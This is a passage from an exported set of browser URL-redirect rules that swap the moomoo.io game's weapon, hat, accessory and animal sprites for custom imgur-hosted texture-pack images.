gur.com/kr8H9g7.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_r.png"}},{destination:"https://i.imgur.com/V9dzAbF.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_r.png"}},{destination:"https://i.imgur.com/aEs3FSU.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_r.png"}},{destination:"https://i.imgur.com/DRzBdFX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_g.png"}},{destination:"https://i.imgur.com/7kbtWfk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_d.png"}},{destination:"https://i.imgur.com/wV42LEE.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_r.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1537030341343,description:"",groupId:"",id:"Redirect_1537030341343",name:"Texture Pack Private - Ruby",objectType:"rule",pairs:[{destination:"https://i.imgur.com/CDAmjux.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/dagger_1_r.png"}},{destination:"https://i.imgur.com/UY7SV7j.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/spear_1_r.png"}},{destination:"https://i.imgur.com/tmUzurk.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/great_hammer_1_r.png"}},{destination:"https://i.imgur.com/oRXUfW8.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/hammer_1_r.png"}},{destination:"https://i.imgur.com/6ayjbIz.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/bat_1_r.png"}},{destination:"https://i.imgur.com/vxLZW0S.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/samurai_1_r.png"}},{destination:"https://i.imgur.com/UZ2HcQw.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/great_axe_1_r.png"}},{destination:"https://i.imgur.com/kr8H9g7.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/axe_1_r.png"}},{destination:"https://i.imgur.com/V9dzAbF.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/sword_1_r.png"}},{destination:"https://i.imgur.com/aEs3FSU.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/stick_1_r.png"}},{destination:"https://i.imgur.com/DRzBdFX.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/grab_1_g.png"}},{destination:"https://i.imgur.com/7kbtWfk.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/grab_1_d.png"}},{destination:"https://i.imgur.com/wV42LEE.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/grab_1_r.png"}},{destination:"https://i.imgur.com/CDAmjux.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/dagger_1_r.png"}},{destination:"https://i.imgur.com/UY7SV7j.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/spear_1_r.png"}},{destination:"https://i.imgur.com/tmUzurk.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/great_hammer_1_r.png"}},{destination:"https://i.imgur.com/oRXUfW8.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/hammer_1_r.png"}},{destination:"https://i.imgur.com/6ayjbIz.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/bat_1_r.png"}},{destination:"https://i.imgur.com/vxLZW0S.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/samurai_1_r.png"}},{destination:"https://i.imgur.com/UZ2HcQw.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/great_axe_1_r.png"}},{destination:"https://i.imgur.com/kr8H9g7.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/axe_1_r.png"}},{destination:"https://i.imgur.com/V9dzAbF.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/sword_1_r.png"}},{destination:"https://i.imgur.com/aEs3FSU.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/stick_1_r.png"}},{destination:"https://i.imgur.com/DRzBdFX.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/grab_1_g.png"}},{destination:"https://i.imgur.com/7kbtWfk.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/grab_1_d.png"}},{destination:"https://i.imgur.com/wV42LEE.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/grab_1_r.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1536927560373,description:"",groupId:"",id:"Redirect_1536927560373",name:"Texture Pack - Ruby",objectType:"rule",pairs:[{destination:"https://i.imgur.com/CDAmjux.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_r.png"}},{destination:"https://i.imgur.com/UY7SV7j.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_r.png"}},{destination:"https://i.imgur.com/tmUzurk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_r.png"}},{destination:"https://i.imgur.com/oRXUfW8.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_r.png"}},{destination:"https://i.imgur.com/6ayjbIz.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_r.png"}},{destination:"https://i.imgur.com/vxLZW0S.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_r.png"}},{destination:"https://i.imgur.com/UZ2HcQw.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_r.png"}},{destination:"https://i.imgur.com/kr8H9g7.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_r.png"}},{destination:"https://i.imgur.com/V9dzAbF.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_r.png"}},{destination:"https://i.imgur.com/aEs3FSU.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_r.png"}},{destination:"https://i.imgur.com/DRzBdFX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_g.png"}},{destination:"https://i.imgur.com/7kbtWfk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_d.png"}},{destination:"https://i.imgur.com/wV42LEE.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_r.png"}},{destination:"https://i.imgur.com/CDAmjux.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_r.png"}},{destination:"https://i.imgur.com/UY7SV7j.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_r.png"}},{destination:"https://i.imgur.com/tmUzurk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_r.png"}},{destination:"https://i.imgur.com/oRXUfW8.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_r.png"}},{destination:"https://i.imgur.com/6ayjbIz.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_r.png"}},{destination:"https://i.imgur.com/vxLZW0S.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_r.png"}},{destination:"https://i.imgur.com/UZ2HcQw.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_r.png"}},{destination:"https://i.imgur.com/kr8H9g7.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_r.png"}},{destination:"https://i.imgur.com/V9dzAbF.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_r.png"}},{destination:"https://i.imgur.com/aEs3FSU.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_r.png"}},{destination:"https://i.imgur.com/DRzBdFX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_g.png"}},{destination:"https://i.imgur.com/7kbtWfk.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_d.png"}},{destination:"https://i.imgur.com/wV42LEE.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/grab_1_r.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1530619393230,description:"",groupId:"",id:"Redirect_1530619393230",name:"Texture Pack Sandbox - Weapons - Part 2",objectType:"rule",pairs:[{destination:"https://i.imgur.com/DVjCdwI.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_2_d.png"}},{destination:"https://i.imgur.com/DVjCdwI.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_2_d.png"}},{destination:"https://i.imgur.com/qu7HHT5.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bow_1_d.png"}},{destination:"https://i.imgur.com/qu7HHT5.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bow_1_d.png"}},{destination:"https://i.imgur.com/HSWcyku.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_d.png"}},{destination:"https://i.imgur.com/HSWcyku.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_d.png"}},{destination:"https://i.imgur.com/TRqDlgX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_1_d.png"}},{destination:"https://i.imgur.com/TRqDlgX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_1_d.png"}},{destination:"https://i.imgur.com/OU5os0h.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_d.png"}},{destination:"https://i.imgur.com/OU5os0h.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_d.png"}},{destination:"https://i.imgur.com/aAJyHBB.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_d.png"}},{destination:"https://i.imgur.com/aAJyHBB.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_d.png"}},{destination:"https://i.imgur.com/WPWU8zC.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_d.png"}},{destination:"https://i.imgur.com/WPWU8zC.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_d.png"}},{destination:"https://i.imgur.com/Fg93gj3.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_d.png"}},{destination:"https://i.imgur.com/Fg93gj3.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_d.png"}},{destination:"https://i.imgur.com/hSqLP3t.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/shield_1_d.png"}},{destination:"https://i.imgur.com/hSqLP3t.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/shield_1_d.png"}},{destination:"https://i.imgur.com/4ZxIJQM.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_d.png"}},{destination:"https://i.imgur.com/4ZxIJQM.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_d.png"}},{destination:"https://i.imgur.com/h5jqSRp.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_d.png"}},{destination:"https://i.imgur.com/h5jqSRp.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_d.png"}},{destination:"https://i.imgur.com/wOTr8TG.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_g.png"}},{destination:"https://i.imgur.com/QKBc2ou.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_g.png"}},{destination:"https://i.imgur.com/wOTr8TG.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_g.png"}},{destination:"https://i.imgur.com/QKBc2ou.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_g.png"}},{destination:"https://i.imgur.com/jKDdyvc.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_g.png"}},{destination:"https://i.imgur.com/jKDdyvc.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_g.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1530619364482,description:"",groupId:"",id:"Redirect_1530619364482",name:"Texture Pack Sandbox - Weapons - Part 1",objectType:"rule",pairs:[{destination:"https://i.imgur.com/DTd8Xl6.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_g.png"}},{destination:"https://i.imgur.com/DTd8Xl6.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_g.png"}},{destination:"https://i.imgur.com/RnkmWgs.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_d.png"}},{destination:"https://i.imgur.com/RnkmWgs.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/stick_1_d.png"}},{destination:"https://i.imgur.com/ROTb7Ks.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_d.png"}},{destination:"https://i.imgur.com/ROTb7Ks.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/dagger_1_d.png"}},{destination:"https://i.imgur.com/ivLPh10.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_g.png"}},{destination:"https://i.imgur.com/ivLPh10.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_g.png"}},{destination:"https://i.imgur.com/phXTNsa.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_d.png"}},{destination:"https://i.imgur.com/phXTNsa.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/bat_1_d.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1530619326443,description:"",groupId:"",id:"Redirect_1530619326443",name:"Texture Pack Sandbox - Hats",objectType:"rule",pairs:[{destination:"https://i.imgur.com/pe3Yx3F.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_40.png"}},{destination:"https://i.imgur.com/in5H6vw.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_18.png"}},{destination:"https://i.imgur.com/4ddZert.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_21.png"}},{destination:"https://i.imgur.com/sULkUZT.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_19.png"}},{destination:"https://i.imgur.com/gJY7sM6.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_9.png"}},{destination:"https://i.imgur.com/uYgDtcZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_16.png"}},{destination:"https://i.imgur.com/JPMqgSc.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_31.png"}},{destination:"https://i.imgur.com/vAOzlyY.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_7.png"}},{destination:"https://i.imgur.com/YRQ8Ybq.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_15.png"}},{destination:"https://i.imgur.com/EwkbsHN.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_13.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11.png"}},{destination:"https://i.imgur.com/f5uhWCk.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_20.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_top.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_top.png"}},{destination:"https://i.imgur.com/pe3Yx3F.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_40.png"}},{destination:"https://i.imgur.com/in5H6vw.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_18.png"}},{destination:"https://i.imgur.com/gJY7sM6.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_9.png"}},{destination:"https://i.imgur.com/4ddZert.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_21.png"}},{destination:"https://i.imgur.com/sULkUZT.png",source:{key:"Url",operator:"Contains",value:".././img/accessories/access_19.png"}},{destination:"https://i.imgur.com/vAOzlyY.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_7.png"}},{destination:"https://i.imgur.com/uYgDtcZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_16.png"}},{destination:"https://i.imgur.com/JPMqgSc.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_31.png"}},{destination:"https://i.imgur.com/YRQ8Ybq.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_15.png"}},{destination:"https://i.imgur.com/EwkbsHN.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_13.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11.png"}},{destination:"https://i.imgur.com/f5uhWCk.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_20.png"}},{destination:"https://i.imgur.com/yfqME8H.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_p.png"}},{destination:"https://i.imgur.com/V8JrIwv.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_11_top.png"}},{destination:"https://i.imgur.com/s7Cxc9y.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_14_top.png"}},{destination:"https://i.imgur.com/I0xGtyZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_26.png"}},{destination:"https://i.imgur.com/I0xGtyZ.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_26.png"}},{destination:"https://i.imgur.com/hmJrVQz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_52.png"}},{destination:"https://i.imgur.com/hmJrVQz.png",source:{key:"Url",operator:"Contains",value:".././img/hats/hat_52.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1530619290416,description:"",groupId:"",id:"Redirect_1530619290416",name:"Texture Pack Sandbox - Animals",objectType:"rule",pairs:[{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animal"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/cow_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/pig_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/chicken_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/cow_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/pig_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/chicken_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/enemy.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/enemy.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1526664529663,description:"",groupId:"",id:"Redirect_1526664529663",name:"Texture Pack Private - Weapons - Part 2",objectType:"rule",pairs:[{destination:"https://i.imgur.com/DVjCdwI.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/crossbow_2_d.png"}},{destination:"https://i.imgur.com/DVjCdwI.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/crossbow_2_d.png"}},{destination:"https://i.imgur.com/qu7HHT5.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/bow_1_d.png"}},{destination:"https://i.imgur.com/qu7HHT5.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/bow_1_d.png"}},{destination:"https://i.imgur.com/HSWcyku.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/spear_1_d.png"}},{destination:"https://i.imgur.com/HSWcyku.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/spear_1_d.png"}},{destination:"https://i.imgur.com/TRqDlgX.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/crossbow_1_d.png"}},{destination:"https://i.imgur.com/TRqDlgX.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/crossbow_1_d.png"}},{destination:"https://i.imgur.com/OU5os0h.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/axe_1_d.png"}},{destination:"https://i.imgur.com/OU5os0h.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/axe_1_d.png"}},{destination:"https://i.imgur.com/aAJyHBB.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/great_axe_1_d.png"}},{destination:"https://i.imgur.com/aAJyHBB.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/great_axe_1_d.png"}},{destination:"https://i.imgur.com/WPWU8zC.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/hammer_1_d.png"}},{destination:"https://i.imgur.com/WPWU8zC.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/hammer_1_d.png"}},{destination:"https://i.imgur.com/Fg93gj3.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/great_hammer_1_d.png"}},{destination:"https://i.imgur.com/Fg93gj3.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/great_hammer_1_d.png"}},{destination:"https://i.imgur.com/hSqLP3t.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/shield_1_d.png"}},{destination:"https://i.imgur.com/hSqLP3t.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/shield_1_d.png"}},{destination:"https://i.imgur.com/4ZxIJQM.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/samurai_1_d.png"}},{destination:"https://i.imgur.com/4ZxIJQM.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/samurai_1_d.png"}},{destination:"https://i.imgur.com/h5jqSRp.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/sword_1_d.png"}},{destination:"https://i.imgur.com/h5jqSRp.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/sword_1_d.png"}},{destination:"https://i.imgur.com/wOTr8TG.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/sword_1_g.png"}},{destination:"https://i.imgur.com/QKBc2ou.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/samurai_1_g.png"}},{destination:"https://i.imgur.com/wOTr8TG.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/sword_1_g.png"}},{destination:"https://i.imgur.com/QKBc2ou.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/samurai_1_g.png"}},{destination:"https://i.imgur.com/jKDdyvc.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/weapons/spear_1_g.png"}},{destination:"https://i.imgur.com/jKDdyvc.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/weapons/spear_1_g.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1526664492125,description:"",groupId:"",id:"Redirect_1526664492125",name:"Texture Pack - Weapons - Part 2",objectType:"rule",pairs:[{destination:"https://i.imgur.com/TRqDlgX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_1_d.png"}},{destination:"https://i.imgur.com/TRqDlgX.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/crossbow_1_d.png"}},{destination:"https://i.imgur.com/OU5os0h.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_d.png"}},{destination:"https://i.imgur.com/OU5os0h.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/axe_1_d.png"}},{destination:"https://i.imgur.com/aAJyHBB.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_d.png"}},{destination:"https://i.imgur.com/aAJyHBB.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_axe_1_d.png"}},{destination:"https://i.imgur.com/WPWU8zC.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_d.png"}},{destination:"https://i.imgur.com/WPWU8zC.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/hammer_1_d.png"}},{destination:"https://i.imgur.com/Fg93gj3.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_d.png"}},{destination:"https://i.imgur.com/Fg93gj3.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/great_hammer_1_d.png"}},{destination:"https://i.imgur.com/4ZxIJQM.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_d.png"}},{destination:"https://i.imgur.com/4ZxIJQM.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_d.png"}},{destination:"https://i.imgur.com/hSqLP3t.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/shield_1_d.png"}},{destination:"https://i.imgur.com/hSqLP3t.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/shield_1_d.png"}},{destination:"https://i.imgur.com/h5jqSRp.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_d.png"}},{destination:"https://i.imgur.com/h5jqSRp.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_d.png"}},{destination:"https://i.imgur.com/wOTr8TG.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_g.png"}},{destination:"https://i.imgur.com/QKBc2ou.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_g.png"}},{destination:"https://i.imgur.com/wOTr8TG.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/sword_1_g.png"}},{destination:"https://i.imgur.com/QKBc2ou.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/samurai_1_g.png"}},{destination:"https://i.imgur.com/jKDdyvc.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_g.png"}},{destination:"https://i.imgur.com/jKDdyvc.png",source:{key:"Url",operator:"Contains",value:".././img/weapons/spear_1_g.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1514047471157,description:"",groupId:"",id:"Redirect_1514047471157",name:"Texture Pack Private - Animals",objectType:"rule",pairs:[{destination:"",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/bull_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/bull_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/wolf_1.png"}},{destination:"https://i.imgur.com/wANrStd.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/wolf_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/wolf_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/cow_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/pig_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/chicken_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/bull_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/bull_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/wolf_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/cow_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/pig_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/chicken_1.png"}},{destination:"https://i.imgur.com/MKOvEr6.png",source:{key:"Url",operator:"Contains",value:"http://dev.moomoo.io/img/animals/enemy.png"}},{destination:"https://i.imgur.com/MKOvEr6.png",source:{key:"Url",operator:"Contains",value:"https://dev.moomoo.io/img/animals/enemy.png"}}],ruleType:"Redirect",status:"Active"},{creationDate:1514046266836,description:"",groupId:"",id:"Redirect_1514046266836",name:"Texture Pack - Animals",objectType:"rule",pairs:[{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/wolf_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/cow_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/pig_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/chicken_1.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_2.png"}},{destination:"",source:{key:"Url",operator:"Contains",value:".././img/animals/bull_1.png"}},{